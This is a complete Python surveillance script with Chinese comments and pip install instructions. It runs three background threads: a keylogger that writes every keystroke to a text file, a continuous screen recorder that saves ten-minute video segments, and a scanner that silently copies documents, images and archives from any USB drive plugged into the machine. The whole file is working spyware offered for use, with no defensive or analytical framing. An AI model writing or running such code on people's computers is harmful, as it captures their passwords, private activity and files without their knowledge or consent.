#!/usr/bin/python3
# 录屏+录按键+拷贝文件
# 安装依赖 pip install opencv-python-headless pillow pynput
import os, cv2, time, shutil
import numpy, threading
from PIL import ImageGrab
from pynput import keyboard

os.chdir(os.path.split(os.path.realpath(__file__))[0])


# 记录键盘按键的按下与抬起
def record_keyboard():
    k = open("keyboard.txt", "w")
    with keyboard.Events() as events:
        for event in events:
            print(f"keyboard: {event}", file=k, flush=True)


threading.Thread(target=record_keyboard, daemon=True).start()


# 录制屏幕内容
def record_screen():
    while True:
        start_time = time.time()
        try:
            video = cv2.VideoWriter(
                f"{int(start_time)}.avi",
                cv2.VideoWriter_fourcc(*"XVID"),
                20,
                ImageGrab.grab().size,
            )
        except:
            time.sleep(2)
            continue
        # 10分钟一段视频,加速后实际时长2分钟
        while time.time() <= start_time + 600:
            try:
                video.write(
                    cv2.cvtColor(numpy.array(ImageGrab.grab()), cv2.COLOR_RGB2BGR)
                )
            except:
                break
            time.sleep(0.2)
        video.release()


threading.Thread(target=record_screen, daemon=True).start()


# 拷贝插入的U盘里的文件
def scan_disk():
    while True:
        # 在主机只有C,D盘的情况下,盘符E~Z都可能为U盘
        for i in range(ord("E"), ord("Z") + 1):
            for root, _, files in os.walk(f"{chr(i)}:/"):
                for f in files:
                    # 只复制以下后缀文件
                    if not os.path.splitext(f)[-1].lower() in [
                        ".md",
                        ".txt",
                        ".pdf",
                        ".doc",
                        ".docm",
                        ".docx",
                        ".csv",
                        ".xls",
                        ".xlsm",
                        ".xlsx",
                        ".ppt",
                        ".pptm",
                        ".pptx",
                        ".jpg",
                        ".jpeg",
                        ".png",
                        ".zip",
                        ".rar",
                        ".7z",
                    ]:
                        continue
                    dst_dir = os.path.join(".", root.replace(":", "", 1))
                    os.makedirs(dst_dir, exist_ok=True)
                    src_file = os.path.join(root, f)
                    dst_file = os.path.join(dst_dir, f)
                    if not os.path.exists(dst_file):
                        shutil.copy(src_file, dst_file)
        time.sleep(10)


threading.Thread(target=scan_disk, daemon=True).start()

# Ctrl+C 结束程序
while True:
    time.sleep(114514)
